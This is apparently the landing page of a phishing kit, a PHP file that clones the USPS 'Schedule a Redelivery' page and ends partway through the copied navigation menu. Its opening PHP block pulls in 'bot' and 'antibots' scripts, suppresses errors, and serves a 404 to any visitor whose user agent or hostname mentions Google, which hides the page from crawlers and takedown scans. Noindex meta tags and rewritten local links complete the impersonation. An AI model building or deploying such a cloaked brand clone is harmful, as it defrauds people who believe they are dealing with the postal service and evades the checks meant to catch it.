<?php
   session_start();
   error_reporting(0);
   include('bot/index.php');
   include('antibots/index.php');
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<!DOCTYPE html>
<!-- saved from url=(0047)redelivery.php -->
<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="robots" content="noodp,noydir">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
    <meta name="description" content="If you missed a package delivery or a mailpiece needing your signature, learn how to schedule redelivery online.">
    <title>Schedule a Redelivery | USPS</title>
    <link rel="stylesheet" href="./1_files/bootstrap.min.css">
    <link rel="stylesheet" href="./1_files/jquery-ui.min.css">
    <link rel="stylesheet" href="./1_files/default-styles.css">
    <link rel="stylesheet" href="./1_files/schedule-redelivery.css">
    <link rel="stylesheet" href="./1_files/calendar.css">
    <link rel="icon" href="./1_files/logo_mobile.svg">
<link type="text/css" rel="stylesheet" href="./1_files/1.css"><style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}button#nebula_div_btn { height: auto !important } .kampyle_vertical_button { background-color:transparent !important;font-family:"Open Sans",sans-serif;cursor:pointer;position:fixed;top:45%;z-index:99999990;height:35px !important;min-height: 35px !important;max-height: 35px !important;width:125px !important;max-width: 125px !important;min-width: 125px !important;-ms-transform:rotate(90deg);-webkit-transform:rotate(90deg);transform:rotate(90deg) } .kampyle_vertical_button .kampyle_button { height:35px;min-height: 35px !important;max-height: 35px !important;width:125px !important;min-width: 125px !important;max-width: 125px !important; background:#333366;color:#ffffff;position:absolute;top:0;left:0;z-index:-1; } .kampyle_vertical_button .kampyle_button-text { color:#ffffff;font-size:14px;line-height:35px;text-align:center;font-weight:normal !important; } .kampyle_vertical_button.kampyle_left .kampyle_button { -webkit-border-radius:3px 3px 0 0;-moz-border-radius:3px 3px 0 0;-ms-border-radius:3px 3px 0 0;border-radius:3px 3px 0 0; } .kampyle_vertical_button.kampyle_right { right:-45px; } .kampyle_vertical_button.kampyle_left { left:-45px } .kampyle_vertical_button.kampyle_right .kampyle_button { -webkit-border-radius:0 0 3px 3px;-moz-border-radius:0 0 3px 3px;-ms-border-radius:0 0 3px 3px;border-radius:0 0 3px 3px } .kampyle_vertical_button.kampyle_right, .kampyle_vertical_button.kampyle_left  { padding: 0 !important; }
</style>

<script src="./1_files/jquery.js"></script>
</head>

<body data-new-gr-c-s-check-loaded="8.871.0" data-gr-ext-installed="" data-gr-ext-disabled="forever">

    <style>
#utility-bar, .util, #headWrap, #ghs {
	display: none;
}
.footer {
    width: auto !important;
}

.global--navigation .global-header--search span.input--wrap {
    height: 42px;
}
.global--navigation form.search.global-header--search {
    z-index: 9999999999;
}

.global--navigation span.input--wrap {
    width: 100%;
    height: 100%;
    height: 42px!important;
    width: 100%;
}

.global--navigation input.input--search.search--submit {
    z-index: 999999;
}
.global--navigation .nav-search .autocorrect {
    top: 43px;
    box-shadow: none;
    background: #ededed !important;

}

.global--navigation .nav-search span.input--wrap,
.global--navigation .nav-search span.input--wrap div.inputLeft,
.global--navigation .nav-search span.input--wrap div.inputRight {
    background: #ededed !important;
    box-shadow: none;
    height: 40px !important;
}

.global--navigation .nav-search input#global-header--search-track-search {
    background: #ededed;
    box-shadow: none;
    left: 0;
    position: relative;
}

.global--navigation .nav-search input.input--search.search--submit {margin-top: 11px;}
.global--navigation .input--wrap .autocorrect,.global--navigation .input--wrap div.autocorrect{display:none!important;}/*
@media (min-width: 958px){.global--navigation~.g-alert, .g-alert~.g-alert, .g-alert {
margin-bottom: 20px;
    margin-top: 0;
	}
div#g-navigation {
 margin-bottom: 0;
}
}*/
/* ELIMINATING LANGUAGE DROPDOWN */
.nav-utility ul.lang-list {
    display: none !important;
}
.nav-utility #link-lang:hover {
    background: none!important;
}
a#link-lang {
    opacity: .5;
    cursor: pointer;
}
/* END ELIMINATING LANGUAGE DROPDOWN */

</style>

<link href="./1_files/megamenu-v3.css" type="text/css" rel="stylesheet">

<div class="nav-utility" id="nav-utility">
	<div class="utility-links" id="utility-header">
	<a tabindex="-1" href="https://www.usps.com/globals/site-index.htm" class="hidden-skip">Go to USPS.com Site Index.</a>
	<a tabindex="-1" id="skiptomain" href="redelivery.php#endnav" class="hidden-skip">Skip all page navigation.</a>
	<a tabindex="-1" name="skiputil" id="skiputil" href="redelivery.php#skipallnav" class="hidden-skip">Skip All Utility Navigation</a>
		<div class="lang-select">
			<a id="link-lang" href="redelivery.php#" style="">
				<span class="visuallyhidden">Current language:</span>
				English
			</a>
			<ul class="lang-list">
				<li class="lang-option">
					<a class="multi-lang-link" tabindex="-1" href="javascript:">English</a>
				</li>
				<li class="lang-option">
					<a class="multi-lang-link" tabindex="-1" href="javascript:">Español</a>
				</li>
				<li class="lang-option last">
					<a class="multi-lang-link" tabindex="-1" href="javascript:"><span class="visuallyhidden">Chinese</span></a>
				</li>
			</ul>
		</div>
		<a id="link-locator" href="https://tools.usps.com/find-location.htm">Locations</a>
		<a id="link-customer" href="https://www.usps.com/help/contact-us.htm">Support</a>
		<a id="link-myusps" href="https://informeddelivery.usps.com/">Informed Delivery</a>
		<a id="login-register-header" class="link-reg" href="https://reg.usps.com/entreg/LoginAction_input?app=REDELIVERY&amp;appURL=https://store.usps.com/redelivery/">Register / Sign In</a>
		<div id="link-cart" style="display: inline-block;"></div>
	</div>
</div>
<div class="global--navigation" id="g-navigation">
	<a tabindex="-1" name="skipallnav" id="skipallnav" href="redelivery.php#endnav" class="hidden-skip">Skip all category navigation links</a>
<div class="nav-full">

  <a class="global-logo" href="https://www.usps.com/" style="vertical-align: baseline;">
    <img src="./1_files/logo-sb.svg" alt="Image of USPS.com logo." aria-label="Image of USPS.com logo.">
  </a>
	<div class="mobile-header">
		<a class="mobile-hamburger" href="redelivery.php#"><img src="./1_files/hamburger.svg" alt="hamburger menu Icon"></a>
		<a class="mobile-logo" href="https://www.usps.com/"><img src="./1_files/logo_mobile.svg" alt="USPS mobile logo"></a>
		<a class="mobile-search" href="redelivery.php#"><img src="./1_files/search.svg" alt="Search Icon"></a>
	</div>

<nav>
  	<div class="mobile-log-state">
		<div id="msign" class="mobile-utility">
			<div class="mobile-sign"><a href="https://reg.usps.com/entreg/LoginAction_input?app=REDELIVERY&amp;appURL=https://store.usps.com/redelivery/">Sign In</a></div>
		</div>
	</div>
    <ul class="nav-list" role="menubar">
      <li class="qt-nav menuheader">
	  	<a tabindex="-1" name="navquicktools" id="navquicktools" href="redelivery.php#navmailship" class="hidden-skip">Skip Quick Tools Links</a>
		<a aria-expanded="false" role="menuitem" tabindex="0" aria-haspopup="true" class="nav-first-element menuitem" href="redelivery.php#">Quick Tools</a>
        <div class="">
			<ul role="menu" aria-hidden="true">
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">
						<img src="./1_files/tracking.svg" alt="Tracking Icon">
						<p>Track a Package</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">
						<img src="./1_files/mailman.svg" alt="Informed Delivery Icon">
						<p>Informed Delivery</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/find-location.htm">
						<img src="./1_files/location.svg" alt="Post Office Locator Icon">
						<p>Find USPS Locations</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps">
						<img src="./1_files/stamps.svg" alt="Stamps Icon">
						<p>Buy Stamps</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/schedule-pickup-steps.htm">
						<img src="./1_files/schedule_pickup.svg" alt="Schedule a Pickup Icon">
						<p>Schedule a Pickup</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/">
						<img src="./1_files/calculate_price.svg" alt="Calculate a Price Icon">
						<p>Calculate a Price</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/ZipLookupAction_input">
						<img src="./1_files/find_zip.svg" alt="Zip Code™ Lookup Icon">
						<p>Look Up a <br>ZIP Code</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://holdmail.usps.com/holdmail/">
						<img src="./1_files/holdmail.svg" alt="Holdmail Icon">
						<p>Hold Mail</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://moversguide.usps.com/?referral=MG82">
						<img src="./1_files/change_address.svg" alt="Change of Address Icon">
						<p>Change My Address</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">
						<img src="./1_files/po_box.svg" alt="Post Office Boxes Icon">
						<p>Rent/Renew a <br>PO Box</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/results/free-shipping-supplies/shipping-supplies/_/N-alnx4jZ7d0v8v">
						<img src="./1_files/free_boxes.svg" alt="Shipping Supplies Icon">
						<p>Free Boxes</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://cns.usps.com/">
						<img src="./1_files/featured_clicknship.svg" alt="Click-N-Ship Icon">
						<p>Click-N-Ship</p>
					</a>
				</li>
			</ul>
        </div>
      </li>
      <li class="menuheader">
	  	<a tabindex="-1" name="navmailship" id="navmailship" href="redelivery.php#navtrackmanage" class="hidden-skip">Skip Send Links</a>
		<a id="mail-ship-width" aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://www.usps.com/ship/">Send</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
            <li class="tool-cns"><a role="menuitem" tabindex="-1" href="https://cns.usps.com/">Click-N-Ship</a></li>
            <li class="tool-stamps"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/">Stamps &amp; Supplies</a></li>
            <li class="tool-zip"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/ZipLookupAction_input">Look Up a ZIP Code</a></li>
            <li class="tool-calc"><a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/">Calculate a Price</a></li>
            <li class="tool-pick"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/schedule-pickup-steps.htm">Schedule a Pickup</a></li>
            <li class="tool-find"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/find-location.htm">Find USPS Locations</a></li>
            <li class="tool-track"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">Tracking</a></li>
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/">Sending</a></li>
				<ul aria-hidden="true">
					<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/letters.htm">Sending Mail</a></li>
					<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/packages.htm">Sending Packages</a></li>
					<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/insurance-extra-services.htm">Insurance &amp; Extra Services</a></li>
					<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/shipping-restrictions.htm">Shipping Restrictions</a></li>
				</ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/online-shipping.htm">Online Shipping</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/label-broker.htm">Label Broker</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/custom-mail.htm">Custom Mail, Cards, &amp; Envelopes</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/prices.htm">Postage Prices</a></li>
          </ul>
		  <ul role="menu" aria-hidden="true">
            <h3 class="desktop-only">&nbsp;</h3>
			<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/mail-shipping-services.htm">Mail &amp; Shipping Services</a></li>
				<ul aria-hidden="true">
				  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/priority-mail-express.htm">Priority Mail Express</a></li>
				  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/priority-mail.htm">Priority Mail</a></li>
				  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/first-class-mail.htm">First-Class Mail</a></li>
				  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/apo-fpo-dpo.htm">Military &amp; Diplomatic Mail</a></li>
			   </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/package-intercept.htm">Redirecting a Package</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/money-orders.htm">Money Orders</a></li>
		   <div class="desktop-only mailship-addition"><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/go-now.htm"><img src="./1_files/go-now.png" alt=" "><span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span></a></div>
		  </ul>

		 <form method="get" class="search global-header--search" tabindex="-1" action="https://www.usps.com/search">
			<span aria-hidden="false" tabindex="-1" class="input--wrap">
				<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-mail-ship">Search USPS.com</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-mail-ship" maxlength="256" name="q" type="text" value="">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
			</form>
        </div>
      </li>
      <li class="menuheader">
	  	<a tabindex="-1" name="navtrackmanage" id="navtrackmanage" href="redelivery.php#navpostalstore" class="hidden-skip">Skip Receive Links</a>
		<a aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://www.usps.com/manage/">Receive</a>
        <div>
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
            <li class="tool-track"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">Tracking</a></li>
            <li class="tool-informed"><a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">Informed Delivery</a></li>
            <li class="tool-intercept"><a role="menuitem" tabindex="-1" href="https://retail-pi.usps.com/retailpi/actions/index.action">Intercept a Package</a></li>
            <li class="tool-redelivery"><a role="menuitem" tabindex="-1" href="redelivery.php">Schedule a Redelivery</a></li>
            <li class="tool-hold"><a role="menuitem" tabindex="-1" href="https://holdmail.usps.com/holdmail/">Hold Mail</a></li>
            <li class="tool-change"><a role="menuitem" tabindex="-1" href="https://moversguide.usps.com/?referral=MG80">Change of Address</a></li>
            <li class="tool-pobol"><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">Rent or Renew PO Box</a></li>
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/">Managing Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">Informed Delivery</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/forward.htm">Forwarding Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/package-intercept.htm">Redirecting a Package</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">PO Boxes</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/mailboxes.htm">Mailbox Guidelines</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/mail-for-deceased.htm">Mail for the Deceased</a></li>
			<div class="desktop-only manage-addition"><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/go-now.htm"><img src="./1_files/go-now-1.png" alt=" "></a></div>
          </ul>
		  <form tabindex="-1" role="search" method="get" class="search global-header--search  track-manage" action="https://www.usps.com/search">
			<span tabindex="-1" aria-hidden="false" class="input--wrap">
				<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-track-manage">Search USPS.com</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-track-manage" maxlength="256" name="q" type="text" value="">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
			</form>
        </div>
      </li>
      <li class="menuheader">
	  	<a tabindex="-1" name="navpostalstore" id="navpostalstore" href="redelivery.php#navbusiness" class="hidden-skip">Skip Shop Links</a>
		<a aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://store.usps.com/store">Shop</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Shop</h3>


            <li class="tool-stamps"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps">Stamps</a></li>
            <li class="tool-supplies"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=shipping-supplies">Shipping Supplies</a></li>
            <li class="tool-cards"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=cards-envelopes">Cards &amp; Envelopes</a></li>
            <li class="tool-pse"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/pse/">Personalized Stamped Envelopes</a></li>
			<li class="tool-coll"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=stamp-collectors">Collectors</a></li>
            <li class="tool-gifts"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=stamp-gifts">Gifts</a></li>
            <li class="tool-business"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/results/business/_/N-1y2576k">Business Supplies</a></li>
          </ul>

          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/money-orders.htm">Money Orders</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/returns-exchanges.htm">Returns &amp; Exchanges</a></li>
            <div class="desktop-only shop-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/store/go-now.htm"><img src="./1_files/go-now-2.png" alt=" "><span class="visuallyhidden">Shop Forever Stamps. Shop now.</span></a>
			</div>
          </ul>
		  <form tabindex="-1" role="search" method="get" class="search global-header--search" action="https://www.usps.com/search">
			<span tabindex="-1" aria-hidden="false" class="input--wrap">
				<label class="visuallyhidden" tabindex="-1" for="global-header--search-track-store">Search the Postal Store: Keyword or SKU</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search the Postal Store: Keyword or SKU" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-store" maxlength="256" name="q" type="text" value="">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
			</form>
        </div>
      </li>
      <li class="menuheader">
	  	<a tabindex="-1" name="navbusiness" id="navbusiness" href="redelivery.php#navinternational" class="hidden-skip">Skip Business Links</a>
		<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://www.usps.com/business/">Business</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
            <li class="tool-calc"><a role="menuitem" tabindex="-1" href="https://dbcalc.usps.com/">Calculate a Business Price</a></li>
            <li class="tool-eddm"><a role="menuitem" tabindex="-1" href="https://eddm.usps.com/eddm/customer/routeSearch.action">Every Door Direct Mail</a></li>
            <div class="desktop-only business-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/business/go-now.htm"><img src="./1_files/go-now-3.png" alt=" "><span class="visuallyhidden">Grow your business with Every Door Direct Mail. Try EDDM now.</span></a>
			</div>
          </ul>

          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>

            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/business-shipping.htm">Business Shipping</a></li>
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/shipping-consolidators.htm">Shipping Consolidators</a></li>
            </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/advertise-with-mail.htm">Advertising with Mail</a></li>
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/every-door-direct-mail.htm">Using EDDM</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/vendors.htm">Mailing &amp; Printing Services</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/customized-direct-mail.htm">Customized Direct Mail</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/political-mail.htm">Political Mail</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/promotions-incentives.htm">Promotions &amp; Incentives</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/informed-delivery.htm">Informed Delivery Marketing</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/product-samples.htm">Product Samples</a></li>
            </ul>
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3 class="desktop-only">&nbsp;</h3>

            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/postage-options.htm">Postage Options</a></li>
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/verify-postage.htm">Verifying Postage</a></li>
            </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/return-services.htm">Returns Services</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/label-broker.htm">Label Broker</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/international-shipping.htm">International Business Shipping</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/manage-mail.htm">Managing Business Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/web-tools-apis/">Web Tools (APIs)</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/prices.htm">Prices</a></li>
          </ul>
		  <form tabindex="-1" role="search" method="get" class="search global-header--search business-bottom" action="https://www.usps.com/search">
			<span tabindex="-1" aria-hidden="false" class="input--wrap">
				<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-business">Search USPS.com</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-business" maxlength="256" name="q" type="text" value="">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
			</form>
        </div>
      </li>
      <li class="menuheader">
		<a tabindex="-1" name="navinternational" id="navinternational" href="redelivery.php#navhelp" class="hidden-skip">Skip International Links</a>
		<a class="menuitem" tabindex="0" aria-expanded="false" aria-haspopup="true" role="menuitem" href="https://www.usps.com/international/">International</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>

            <li class="tool-calc"><a role="menuitem" tabindex="-1" href="https://ircalc.usps.com/">Calculate International Prices</a></li>
            <li class="tool-international-labels"><a role="menuitem" tabindex="-1" href="https://cns.usps.com/">Print International Labels</a></li>
            <div class="desktop-only international-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/international/go-now.htm"><img src="./1_files/go-now-4.png" alt=" "><span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span></a>
			</div>
          </ul>

          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/international-how-to.htm">Printing &amp; Shipping International</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/mail-shipping-services.htm">International Mail Services</a></li>
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/gxg.htm">Global Express Guaranteed</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/priority-mail-express-international.htm">Priority Mail Express International</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/priority-mail-international.htm">Priority Mail International</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/first-class-mail-international.htm">First-Class Mail International</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/insurance-extra-services.htm">International Insurance &amp; Extra Services</a></li>
            </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/preparing-international-shipments.htm">Sending International Shipments</a></li>
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/shipping-restrictions.htm">Shipping Restrictions</a></li>
            </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/customs-forms.htm">Completing Customs Forms</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/apo-fpo-dpo.htm?pov=international">Military &amp; Diplomatic Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/money-transfers.htm">Sending Money Abroad</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/passports.htm">Passports</a></li>
          </ul>
			<form tabindex="-1" role="search" method="get" class="search global-header--search" action="https://www.usps.com/search">
			<span tabindex="-1" aria-hidden="false" class="input--wrap">
				<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-international">Search USPS.com</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-international" maxlength="256" name="q" type="text" value="">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
			</form>
        </div>
      </li>
      <li class="menuheader">
	  	<a tabindex="-1" name="navhelp" id="navhelp" href="redelivery.php#navsearch" class="hidden-skip">Skip Help Links</a>
		<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://faq.usps.com/s/">Help</a>
			<div class="repos">
			  <ul role="menu" aria-hidden="true">
				<li><a role="menuitem" tabindex="-1" href="https://faq.usps.com/s/">FAQs</a></li>
				<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/missing-mail.htm">Finding Missing Mail</a></li>
				<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/claims.htm">Filing a Claim</a></li>
				<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/refunds.htm">Requesting a Refund</a></li>
			  </ul>
			</div>
      </li>
	  <li class="nav-search menuheader">
	  	<a tabindex="-1" name="navsearch" id="navsearch" href="redelivery.php#endnav" class="hidden-skip">Skip Search</a>
		<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="redelivery.php#">Search USPS.com</a>
		<div class="repos">
		<!-- Search -->
		<span aria-hidden="false" class="input--wrap-label">
			<label class="visuallyhidden" for="styleguide-header--search-track">Search USPS.com</label>
		</span>

		<form tabindex="-1" role="search" method="get" class="search global-header--search" action="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=">
			<span tabindex="-1" aria-hidden="false" class="input--wrap">
				<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-search">Search USPS.com</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-search" maxlength="256" name="q" type="text" value="">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
		</form>

		<div class="empty-search">
			<p>Top Searches</p>
			<ul aria-hidden="true">
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=PO%20Boxes">PO BOXES</a></li>
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Passports">PASSPORTS</a></li>
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Free%20Boxes">FREE BOXES</a></li>
			</ul>
		</div>
		<!-- END Search -->
		</div>
	  </li>

    </ul>
  </nav>

 	<div class="search--wrapper-hidden" id="search--display">
			<span aria-hidden="false" class="input--wrap-label">
			</span>
		<form role="search" method="get" class="search global-header--search" action="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=">
			<span aria-hidden="false" class="input--wrap">
				<div class="easy-autocomplete search-box">
					<label class="visuallyhidden" for="global-header--search-track-mob-search">Enter Search term for Search USPS.com</label>
					<input autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q fsrVisible global-header--search-track" id="global-header--search-track-mob-search" maxlength="256" name="q" type="text" value="">
					<input value="Search" class="input--search search--submit" type="submit">
				</div>
                    <div class="autocorrect"><ul></ul></div>
			</span>
		</form>

				<div class="empty-search">
					<p>Top Searches</p>
					<ul>
						<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=PO%20Boxes">PO BOXES</a></li>
						<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Passports">PASSPORTS</a></li>
